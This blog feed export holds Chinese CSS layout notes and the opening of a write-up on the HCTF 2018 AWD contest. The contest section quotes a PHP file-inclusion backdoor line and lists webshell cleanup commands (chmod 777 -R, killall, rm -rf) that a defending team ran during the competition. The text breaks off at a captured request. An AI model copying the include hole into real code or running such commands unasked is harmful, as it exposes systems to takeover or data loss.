class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">    font-style:italic;</span><br><span class="line">    font-variant:small-caps; </span><br><span class="line">    font-weight:bold; </span><br><span class="line">    font-size:12px; </span><br><span class="line">    line-height:1.5em; </span><br><span class="line">    font-family:&quot;宋体&quot;,sans-serif;</span><br><span class="line">&#125;</span><br><span class="line">缩写为：</span><br><span class="line"></span><br><span class="line">body&#123;</span><br><span class="line">    font:italic  small-caps  bold  12px/1.5em  &quot;宋体&quot;,sans-serif;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="textarea标签相关属性"><a href="#textarea标签相关属性" class="headerlink" title="textarea标签相关属性"></a>textarea标签相关属性</h2><ol><li>控制元素大小可调整性：<code>resize</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* Keyword values */</span><br><span class="line">resize: none;  /*默认*/</span><br><span class="line">resize: both;</span><br><span class="line">resize: horizontal;</span><br><span class="line">resize: vertical;</span><br><span class="line">resize: block;</span><br><span class="line">resize: inline;</span><br><span class="line"></span><br><span class="line">/* Global values */</span><br><span class="line">resize: inherit;</span><br><span class="line">resize: initial;</span><br><span class="line">resize: unset;</span><br></pre></td></tr></table></figure></li></ol><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><ol><li>基本内容<code>background</code></li></ol><ul><li>背景色: <code>background-color: red</code></li><li>背景图像：<code>background-image: url(http://img)</code></li><li>背景重复：<code>background-repeat: no-repeat | repeat-x | repreat-y | repeat</code><br>效果分别为，不重复 | 水平重复 | 垂直重复 | 都重复</li><li>背景位置：<code>background-position: px | rems | % | center | left | right | top | bottom</code></li><li><p>渐变：<code>background-image</code><br><code>background-image: linear-gradient(to bottom, yellow, orange 40%, yellow)</code><br>使用渐变函数:<code>linear-gradient()</code>传入渐变方向(to bottom | to right | to bottom right等), 渐变色。</p></li><li><p>重复渐变<br><code>background-image: repeating-linear-gradient(to right, yellow, orange 25px, yellow 50px);</code><br>0-&gt;50%，50%-&gt;100%周期渐变</p></li><li><p>背景附着：<code>background-attachment: scroll | fixed | local</code><br>内容滚动时，背景显示的效果。<br>demo:<a href="https://github.com/mdn/learning-area/tree/master/css/styling-boxes/backgrounds" target="_blank" rel="noopener">https://github.com/mdn/learning-area/tree/master/css/styling-boxes/backgrounds</a></p></li></ul><p>简写：<code>background: yellow linear-gradient(to bottom, orange, yellow) no-repeat left center scroll;</code></p><ul><li>背景大小: background-size<br><code>background-size: auto | &lt;长度值&gt; | &lt;百分比&gt; | cover | contain</code></li></ul><ul><li>auto：默认值，不改变背景图片的原始高度和宽度；<br>&lt;长度值&gt;：成对出现如200px 50px，将背景图片宽高依次设置为前面两个值，当设置一个值时，将其作为图片宽度值来等比缩放；</li></ul><ul><li>&lt;百分比&gt;：0％~100％之间的任何值，将背景图片宽高依次设置为所在元素宽高乘以前面百分比得出的数值，当设置一个值时同上；</li><li>cover：顾名思义为覆盖，即将背景图片等比缩放以填满整个容器；</li><li>contain：容纳，即将背景图片等比缩放至某一边紧贴容器边缘为止。</li></ul><ol start="2"><li><p>背景源：background-origin<br><code>background-origin:  border-box | padding-box | content-box;</code><br>参数分别表示背景图片是从边框，还是内边距（默认值），或者是内容区域开始显示。</p></li><li><p>背景剪切： background-clip<br><code>background-clip ： border-box | padding-box | content-box | no-clip</code><br>参数分别表示从边框、或内填充，或者内容区域向外裁剪背景。no-clip表示不裁切，和参数border-box显示同样的效果。backgroud-clip默认值为border-box。</p></li></ol><blockquote><p>如果要剪切成圆形，则写一个 border-radius,然后在这个盒子中赋一个背景图即可。</p></blockquote><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><p>块状模型都具备盒子模型的特征</p><ol><li>盒子模型边框<br>粗细：<code>border-width: 2px</code><br>样式：<code>border-style:solid</code>,常见的值有: <code>dashed (虚线)|dotted(点线)|solid(实线)</code><br>颜色：<code>border-color: red</code></li></ol><p>可以简写为：<code>border: 2px solid red</code><br>如果只想设置底边：<code>border-bottom: 2px solid red</code>，其他边同理：<code>border-top | border-right | border-left</code></p><ol start="2"><li>边框圆角<br><code>border-radius:10px;</code><br><code>border-radius: 5px 4px 3px 2px; /*四个半径值分别是左上角、右上角、右下角和左下角，顺时针 */</code></li></ol><p>demo:半圆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div.circle&#123;</span><br><span class="line">    height:50px</span><br><span class="line">    width:100px;</span><br><span class="line">    background:#9da;</span><br><span class="line">    border-radius:50px 50px 0 0 ;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;div class=&quot;circle&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><ol start="3"><li>边框阴影(box-shadow)<br><code>box-shadow: X轴偏移量 Y轴偏移量 [阴影模糊半径] [阴影扩展半径] [阴影颜色] [投影方式];</code><br><img src="http://static.zybuluo.com/Passer6y/pzip4o2cyt03cu3p0edd2opl/image_1d0mmuhujfbr4dp12mmc6k6aa9.png" alt="image_1d0p25k321kol1s1j1a3916t04s3p.png-113.4kB"></li></ol><p>不同浏览器适配：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   -webkit-box-shadow:;</span><br><span class="line">-moz-box-shadow:;</span><br><span class="line">box-shadow:;</span><br></pre></td></tr></table></figure></p><ol start="4"><li>盒子模型宽和高<br><img src="http://static.zybuluo.com/Passer6y/pzip4o2cyt03cu3p0edd2opl/image_1d0mmuhujfbr4dp12mmc6k6aa9.png" alt="image_1d0mmuhujfbr4dp12mmc6k6aa9.png-205.6kB"><br><img src="http://static.zybuluo.com/Passer6y/zm54817nripf8pdwxa8jisso/image_1d0mn2q7i52u18dtu9te93g35m.png" alt="image_1d0mn2q7i52u18dtu9te93g35m.png-20.8kB"><br>几个关键参数：</li></ol><ul><li>宽：<code>width</code></li><li>填充：<code>padding</code></li><li>边框：<code>border</code></li><li>边界：<code>margin</code></li></ul><p>同样也可以设置顶底左右的距离,如：<code>padding-top</code>等等,<br>简写：<br>top、right、bottom、left值相同：<code>margin:10px 10px 10px 10px;</code> =&gt;<code>margin: 10px</code><br>top和bottom，left和right相同:<code>margin:10px 20px 10px 20px;</code>=&gt;<code>margin:10px 20px;</code></p><p>如果left和right相同：<br><code>margin:10px 20px 30px 20px;</code><br>可缩写为：<br><code>margin:10px 20px 30px;</code></p><ol start="5"><li>溢流:<br><code>overflow: auto | hidden | visible</code></li></ol><ul><li>auto: 溢出盒子的内容将被隐藏，出现滚动条</li><li>hidden: 溢出的内容隐藏</li><li>visible: 溢出的内容显示在盒子外边</li></ul><ol start="6"><li>轮廓：Outline</li></ol><ol start="7"><li><p>盒子模型：<code>box-sizing</code><br><code>box-sizing: content-box | border-box | inherit</code><br>设置成border-box后，即margin，padding这些不会再影响width和height的总长。</p></li><li><p>盒子元素类型转换<br>转换为内联元素：<code>display:inline</code><br>转化为块状元素：<code>display:block</code><br>转化为内联块状元素：<code>display: inline-block</code></p></li></ol><p>还有一些其他的显示类型：</p><ul><li><code>display: table</code>: 可以像处理table布局哪样处理非table元素。</li><li><code>display: flex</code>：可以布置一些弹性等宽容器，或者垂直居中内容等</li><li><code>display: grid</code>：css网格。</li></ul><ol start="9"><li>盒子宽和高的约束</li></ol><p>demo: 父容器在最大和最小的限制内，它将填满整个视图，父小于1280px，布局保持1280px，小于480px，则滚动才能看到全部内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">width: 70%</span><br><span class="line">max-width: 1280px;</span><br><span class="line">min-width: 480px;</span><br><span class="line">margin: 0 auto;  /*在父容器中上下边距为0，左右居中*/</span><br></pre></td></tr></table></figure></p><p>demo2: 将图像/视频，限制在容器内部<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">display: block;</span><br><span class="line">margin: 0 auto;</span><br><span class="line">max-width: 100%;   /*父容器缩小到小于图像宽度，图像会一起缩小*/</span><br></pre></td></tr></table></figure></p><h2 id="样式列表"><a href="#样式列表" class="headerlink" title="样式列表"></a>样式列表</h2><ol><li>列表特定样式<br>作用在<code>&lt;ul&gt;</code>和<code>&lt;ol&gt;</code>元素上：</li></ol><ul><li>列表项目符号的类型：<code>list-style-type: upper-roman | none | square</code> (大写的罗马字，或者方形符号,或者没有)</li><li>符号在列表项内还是外： <code>list-style-position: inside | outside(默认)</code></li><li>项目符号自定义图片：<code>list-style-image: url(star.svg)</code></li></ul><p>简写：<code>list-style: square url() inside;</code></p><ol start="2"><li>管理列表计数</li></ol><ul><li><p><code>start</code>：从1以外的数字开始计数<br>demo: 从4开始计数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol start=&quot;4&quot;&gt;</span><br><span class="line">  &lt;li&gt;4&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;5&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;6&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;7&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>reversed</code>: 列表倒计数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol start=&quot;4&quot; reversed&gt;</span><br><span class="line">    &lt;li&gt;4&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;3&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>value</code>: 设置列表项指定数值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li value=&quot;2&quot;&gt;2&lt;/li&gt;</span><br><span class="line">    &lt;li value=&quot;10&quot;&gt;10&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ol><li>链接状态<br>每一个状态都对应的伪类来应用样式</li></ol><ul><li>Link(未访问过的): 默认，可以使用<code>:link</code>来应用样式</li><li>Visited:已经被访问过的，同理可以用<code>:Visited</code>伪类来应用样式</li><li>Hover：鼠标停留在链接上</li><li>Focus：被选中(如通过tab移动到这个链接)时</li><li>Active：被激活的时候(被点击)。</li></ul><blockquote><p>使用的顺序是从上到下的，因为当链接被激活的时候是选中状态的。</p></blockquote><ol start="2"><li>链接中包含图标<br>思路和之前的将列表的原点替换成图片思路一样，引入背景图标，将背景的位置设为<code>100% 0</code>右上角，设置背景的大小，然后将文字右填充<code>padding-right:</code>设成比背景大一点即可。</li></ol><p>demo:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a[href*=&quot;http&quot;]&#123;</span><br><span class="line">  background: no-repeat url(&apos;https://mdn.mozillademos.org/files/12982/external-link-52.png&apos;) 100% 0;</span><br><span class="line">  background-size: 1rem;</span><br><span class="line">  padding-right:1.2rem;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="浮动布局"><a href="#浮动布局" class="headerlink" title="浮动布局"></a>浮动布局</h2><p>让两块状元素(默认换行)并排显示(浮动效果)：<code>float:left | right</code><br>一般应用于首字下沉，或者图片被文字环绕的情景，多列浮动布局<br>demo:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  width: 90%;</span><br><span class="line">  max-width: 900px;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div:nth-of-type(1) &#123;</span><br><span class="line">  width: 36%;</span><br><span class="line">  float: left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div:nth-of-type(2) &#123;</span><br><span class="line">  width: 30%;</span><br><span class="line">  float: left;</span><br><span class="line">  margin-left: 4%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div:nth-of-type(3) &#123;</span><br><span class="line">  width: 26%;</span><br><span class="line">  float: right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="2"><li>清除浮动<br><code>clear: left | right | both</code><br>清除左|右|全部浮动，一般出现在浮动元素下方的元素需要清除。</li></ol><ol start="3"><li>清除浮动的另一种方法<br>设置元素溢出时处理方案：<code>overflow: auto;</code></li></ol><h2 id="布局：定位"><a href="#布局：定位" class="headerlink" title="布局：定位"></a>布局：定位</h2><ol><li><p>绝对定位(position: absolute)<br>设置<code>position: absolute</code>后，然后使用<code>left | right | top | bottom</code>对于其最近的一个具有定位属性的父包含块进行绝对定位(没有则选择body元素，即浏览器窗口)<br>demo:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">    left:100px;</span><br><span class="line">    top:200px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>相对定位(position: relative)<br>同样设置好<code>position: relative</code>之后，使用<code>left|right|top|bottom</code>相对于原来位置移动</p></li><li><p>固定定位(position: fixed)<br>设置<code>position: fixed</code>，使用<code>left|right|top|bottom</code>，效果和绝对定位类似，他是相对于屏幕固定的，不会随着浏览器滚动条变动，也不会因为窗口的放大或缩小而动态变化。</p></li></ol><blockquote><p>可以给导航栏用</p></blockquote><ol start="4"><li>Relative和Absolute组合使用<br>相对其他元素进行定位。<br>参照定位元素:<code>position: relative</code><br>相对定位元素:<code>position: absolute</code>之后即可以使用left、top等熟悉进行偏移了。</li></ol><ol start="5"><li>重叠：<code>z-index</code><br>设置图层位置，也就是谁在上谁在下</li></ol><p>即以z轴作参考，数值大的在上层<br>demo:<br><code>z-index:-1</code></p><h2 id="弹性盒子布局"><a href="#弹性盒子布局" class="headerlink" title="弹性盒子布局"></a>弹性盒子布局</h2><p>继css布局工具只有float和position以来，flex实现了一些它们难以实现的功能。</p><ol><li>flex模型说明</li></ol><p><img src="http://static.zybuluo.com/Passer6y/uwicaulmzsjpmzmiwvrhajvc/image_1d1g3ld6ka2s19laqkjsbi22e19.png" alt="image_1d1g3ld6ka2s19laqkjsbi22e19.png-47.2kB"></p><ul><li>主轴（main axis）是沿着 flex 元素放置的方向延伸的轴（比如页面上的横向的行、纵向的列）。该轴的开始和结束被称为 main start 和 main end。</li><li>交叉轴（cross axis）是垂直于 flex 元素放置方向的轴。该轴的开始和结束被称为 cross start 和 cross end。</li><li>设置了 display: flex 的父元素（在本例中是 <section>）被称之为 flex 容器（flex container）。</section></li><li>在 flex 容器中表现为柔性的盒子的元素被称之为 flex 项（flex item）（本例中是 <article> 元素</article></li></ul><ol start="2"><li><p>设置弹性盒子<br><code>display: flex</code></p></li><li><p>设置展示方向<br><code>flex-direction: row | row-reverse | column | column-reverse</code></p></li></ol><p>默认为row，即排列成一行，加了reverse即元素顺序倒序。</p><ol start="4"><li><p>换行<br><code>flex-wrap: wrap | nowrap</code><br>默认值为:nowrap，即不换行<br>demo:<br>元素溢出时换行设置换行：<code>flex-wrap: wrap</code></p></li><li><p><code>flex-flow</code>缩写(上述两个参数)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flex-direction: row;</span><br><span class="line">flex-wrap: wrap;</span><br></pre></td></tr></table></figure></li></ol><p>-&gt;<br><code>flex-flow: row wrap</code></p><ol start="6"><li>动态尺寸<br><code>flex: &lt;number&gt;;</code></li></ol><p>demo:flex弹性盒子中三个article盒子宽(高)度比例为1:2:3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">article:nth-of-type(1)&#123;</span><br><span class="line">    flex: 1;</span><br><span class="line">&#125;</span><br><span class="line">article:nth-of-type(2)&#123;</span><br><span class="line">    flex: 2;</span><br><span class="line">&#125;</span><br><span class="line">article:nth-of-type(3)&#123;</span><br><span class="line">    flex: 3; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>demo2：<br>还可以指定最小值，每个盒子分配完100px后，接着按比例将剩余空间分配<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">article:nth-of-type(1)&#123;</span><br><span class="line">  flex: 1 100px;</span><br><span class="line">&#125;</span><br><span class="line">article:nth-of-type(2)&#123;</span><br><span class="line">  flex: 2 100px;</span><br><span class="line">&#125;</span><br><span class="line">article:nth-of-type(3)&#123;</span><br><span class="line">  flex: 3 100px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="7"><li>垂直对齐</li></ol><p>控制flex在交叉轴(纵轴)的位置<br><code>align-items: stretch | center | start | end</code><br>stretch：默认值，在交叉轴方向拉伸，以填充父容器，如果父容器在交叉轴没有固定的高度，则和最长的flex项高度保持一致</p><blockquote><p>demo:<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-items" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-items</a></p></blockquote><p><code>align-self: flex-start | flex-end</code><br> 可以覆盖<code>align-items</code>的效果<br> demo:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> button:first-child &#123;</span><br><span class="line">  align-self: flex-end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="8"><li>水平对齐<br><code>justify-content: center | start | end | flex-start | flex-end | space-between | space-around | space-evenly等等</code></li></ol><ul><li>flex-start：从行首起始位置开始排列</li><li>start： 从主轴开始排列</li><li>space-between: 均匀排列元素，首个元素放置于起点，末尾元素放置于终点</li><li>space-around： 均匀排列每个元素，每个元素周围分配相同的空间</li><li>space-evenly;  均匀排列每个元素，每个元素之间的间隔相等 </li></ul><blockquote><p>全部参数：<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/justify-content" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/justify-content</a></p></blockquote><ol start="9"><li>flex项排序<br><code>order: &lt;number&gt;;</code>：数值越大的在越后面</li></ol><p>demo:将第一个按钮放最后，后边的以此往前移动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">button:first-child&#123;</span><br><span class="line">        order: 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="10"><li>flex 嵌套<br>可以为flex项目的孩子设置<code>display:flex</code>使之表现为flexible box</li></ol><p>缩写语法规则：<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex</a></p><ol start="11"><li>flex 缩写<br><code>flex: 0 0 200px;</code></li></ol><ul><li>参数1：<code>flex-grow</code>，该值表示和其他flex盒子成的比例关系</li><li>参数2：<code>flex-shrink</code>, 默认宽度大于容器时的一个收缩规则，也是比例关系。</li><li>参数3：<code>flex-basis</code>, 有效宽度值，即基准值。</li></ul><h2 id="多列布局"><a href="#多列布局" class="headerlink" title="多列布局"></a>多列布局</h2><blockquote><p>文本的多列布局？</p><ol><li>多列布局： <code>Columns</code><br><code>columns：&lt;column-width&gt; || &lt;column-count&gt;</code>，属性值列宽和列数。<br>demo: 200px 两列<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">columns: 200px 2;</span><br></pre></td></tr></table></figure></li></ol></blockquote><ol start="2"><li><p>列宽： <code>column-width</code><br><code>column-width: auto | &lt;length&gt;</code>，可以单独使用。</p></li><li><p>列数：<code>column-count</code><br><code>column-count：auto | &lt;integer&gt;</code></p></li><li><p>列间距： <code>column-gap</code><br><code>column-gap: normal || &lt;length&gt;</code>，默认1em，也可以用px作单位</p></li><li><p>列边框样式：<code>column-rule</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">column-rule:&lt;column-rule-width&gt;|&lt;column-rule-style&gt;|&lt;column-rule-color&gt;</span><br></pre></td></tr></table></figure></li></ol><p>和border类似，设置列边框的宽/样式/颜色<br>demo：<br><code>column-rule: 2px dotted green;</code></p><ol start="6"><li>跨列设置: <code>column-span</code><br><code>column-span:all | none</code>， all为跨越所有列</li></ol><ol start="17"><li>CSS3 opacity属性<br>设置元素的不透明级别<br>demo: 设置div元素为透明<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">    opacity: 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="0x03-元素"><a href="#0x03-元素" class="headerlink" title="0x03 元素"></a>0x03 元素</h2><p>元素分类：</p><ul><li><p>块状：默认为块级元素一个占一行(从新一行开始，后面的元素另起一行)。高、宽、行高、顶和底边距可设，默认占父容器100%。<br>使用<code>display:block</code>可将非块状元素转化成块状。常见元素有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;、&lt;p&gt;、&lt;h1&gt;...&lt;h6&gt;、&lt;ol&gt;、&lt;ul&gt;、&lt;dl&gt;、&lt;table&gt;、&lt;address&gt;、&lt;blockquote&gt; 、&lt;form&gt;</span><br></pre></td></tr></table></figure></li><li><p>内联：和其他元素在一行上，元素高、宽度及顶和底边距不可设置，元素宽度即其包含的内容的宽度，不可改变。可以使用<code>display: inline</code>将非内联元素转换为内联元素。常见元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt;、&lt;span&gt;、&lt;br&gt;、&lt;i&gt;、&lt;em&gt;、&lt;strong&gt;、&lt;label&gt;、&lt;q&gt;、&lt;var&gt;、&lt;cite&gt;、&lt;code&gt;</span><br></pre></td></tr></table></figure></li><li><p>内联块状： 同时具备内联元素和块状的特点，和其他元素在一行，元素边距可设置。可以使用<code>display: inline-block</code>转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img&gt;、&lt;input&gt;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;想个小组wiki写个炫酷的前端，这半个月来一直在不断的练习前端开发，分享一些自己学习过程的记录~&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Code" scheme="http://passer6y.fun/tags/Code/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 2018 AWD小记</title>
    <link href="http://passer6y.fun/2018/12/20/HCTF%202018%20AWD%E5%B0%8F%E7%BB%93/"/>
    <id>http://passer6y.fun/2018/12/20/HCTF 2018 AWD小结/</id>
    <published>2018-12-20T14:02:00.000Z</published>
    <updated>2018-12-20T14:05:14.000Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>跑了这么远去杭州，把小组的脸都给丢尽了…<br>这里说几个我们吃到亏吧，第一次打awd，举办方的赛制和我们之前练习的情形不太一样。可能考虑到去线下的都是老赛棍，就没有照顾到我们这样的萌新，赛制说明都没有。 直到打到后来才知道，10分钟结算一轮flag，如果被攻击的服务被check宕机了，那么这个flag是无效的。即使你在这10分钟内提交flag，他给你显示flag提交成功，但最后结算的时候是不会算上分的。被check宕机的队伍会扣除60分给没有宕机的队伍每人加10分。我们当时想着提了一堆flag打得贼带感，结果能加上的分少的可怜，第一题除了天枢和蓝莲花的师傅偶尔是正常的一轮能涨上100多分，其他队伍全程宕机，所以<strong>防守和进攻同等重要</strong>。</p><p>其次就是check相关的，我们配网络连ssh浪费了很多时间，<code>1l 0O</code>分不清，导致我们一上线，我们机子里就被种了一堆马。然后我们拿不到最初始的源码，回滚到第一次备份都还是很多页面都是坏的， 最后web1被check宕了2天整的。然后修洞，不要想着给全站555就能防住被传马了，这次上传点也是一个check点，在后面会结合check流量进行详细分析。</p><p>再说说运维相关的，这次我们队我负责运维的，有个比较恼火的东西就是，我们上传的洞一直没修复，因为我一直就用的555去防的，导致我们运维的时候想改一点东西，就会加上写的权限，结果种上了一堆内存马。事后去问他们，题目通过散列根据ip生成随机文件名随机密码的不死马，有一个守护进程的马，还有不断复制的马。我当时运维的时候，web1还行，web2一上线找路由规则就摸了半天，他那个是.htaccess套.htaccess的，所以我给自己目录传一个运维shell，怎么都访问不到。其次就是菜刀连不上的，我拿着burp，一条条命令手动输：</p><ol><li>team用户<code>chmod 777 -R ./upload</code>,给与文件夹的写权限才能删里面的文件</li><li>www-data用户：<code>killall -u www-data</code>，清掉不死马进程</li><li>www-data：<code>chmod 777 -R ./upload</code>,将马权限修改</li><li>最后再<code>rm -rf</code>才能删掉<br>但是这过程因为我们没修洞.. 在用team用户给写权限的时候，一堆马又飞进来了…<br>在这上面浪费的时间挺多的，所以得提前准备好py菜刀，提前写好这几步操作。</li></ol><p>这次比赛，菜刀是别想了，因为临近考试，webshell的利用脚本还有bug没调试完，所以我们就只能现写各种漏洞类型的利用程序，也就仅仅种个马，读个flag就没了。还有其他的套路都没玩的上。</p><h1 id="check流量分析"><a href="#check流量分析" class="headerlink" title="check流量分析"></a>check流量分析</h1><p>事后把waf记录的流量导出来整理分析了一番，这次举办方的check可谓是十足的严格，第一天全场web宕机。还有他们还会check是否使用通防。</p><p>从流量中可以看到，web1的check流程：<br>注册-&gt;登录-&gt;上传图片-&gt;包含图片<br>之所以还在数据中看到一堆乱七八糟的类似payload的东西，这肯定就是主办方check通防的方法了。</p><p>所以：</p><ol><li>千万不要用555，宁可上一个.htaccess(虽然后面还是被蓝莲花的师傅rm/覆盖了)</li><li>不要想着banip了，checkbot的ip会变几次，更何况还会被举报，check到一次扣800分…</li><li>切完不要直接删功能点，文件包含这个点，看着就是一个后门<code>&#39;&lt;?php include($_GET[&#39;img&#39;]); ?&gt;&#39;</code>,结果谁知道这是个check点..</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">time: </span><br><span class="line">ip: 192.168.233.42</span><br><span class="line">POST 